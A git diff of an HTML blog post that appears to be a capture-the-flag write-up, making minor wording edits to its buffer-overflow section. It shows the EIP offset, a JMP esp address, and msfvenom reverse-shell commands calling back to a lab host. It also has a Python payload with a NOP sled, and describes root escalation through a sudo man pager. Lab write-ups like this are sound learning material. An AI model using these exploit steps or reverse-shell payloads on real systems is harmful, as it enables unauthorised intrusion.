@@ -105,13 +105,13 @@ I attempted to bruteforce the password while I was examining the code using Olly
         </span><span class="k">fi
 done</span> </code></pre></figure>
 
-<p>I found the password when I was reading the get_reply function (the string that was being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
+<p>I found the password when I was reading the get_reply function (the string that is being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
 <img src="ollyDBGCode.png" alt="Olly Code" />
-I used msf-pattern_create to generate a pattern with 1000 characters to test if the application would crash and then I used msf-pattern_offset to get the exact position.
+I used msf-pattern_create to generate a pattern with 1000 characters to test if the application crashes and then I used msf-pattern_offset to get the exact position.
 <img src="BOFTest1.png" alt="BOF Test 1" />
 <img src="BOFTest2.png" alt="BOF Test 2" /> 
 <img src="BOFTest3.png" alt="BOF Test 3" />
-To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).<br />
+To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means that we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).<br />
 I generated two shellcodes, one for Windows and the other one for Linux using msfvenom.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.10 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> py <span class="nt">-v</span> shellcode <span class="nt">-a</span> x86 –platform Windows <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a"</span> <span class="c">#Windows shellcode</span>
@@ -138,7 +138,7 @@ msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv"
 <span class="c1">#Payload with 16 NOPs
 </span><span class="k">print</span> <span class="n">junk</span><span class="o">+</span><span class="n">retAddr</span><span class="o">+</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">shellcode</span></code></pre></figure>
 
-<p>I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine).
+<p>I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine, so I knew that it would work).
 <img src="remoteShell1.png" alt="Remote shell 1" />
 <img src="remoteShell2.png" alt="Remote shell 2" />
 <br /></p>
@@ -146,7 +146,7 @@ msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv"
 <p>Running sudo -l we can see that puck can run a script as root without suppling the password. This script has three functions (network, proclist and manual). The manual function runs the man command with the argument that we supply.
 <img src="sudoPuck.png" alt="Sudo -l" />
 <img src="functions.png" alt="Functions" />
-The man command uses a pager to show the manual and this pager allows us to run commands (and even to get a shell). I won’t explain the method but <a href="https://gtfobins.github.io/gtfobins/man/">I’ll leave a link to it</a>.
+The man command uses a pager to show the manual and this pager allows us to run commands. I won’t explain the method but <a href="https://gtfobins.github.io/gtfobins/man/">I’ll leave a link to it</a>.
 <img src="privesc.png" alt="privesc" /></p>
 <h1>Conclusions</h1>
 <p>This is a really fun and a bit difficult machine that helped me practising buffer overflow. I’ve learnt about the NOP sled technique and the importance of having a Windows VM to test programs in there (I’ll work on this in the future).</p>
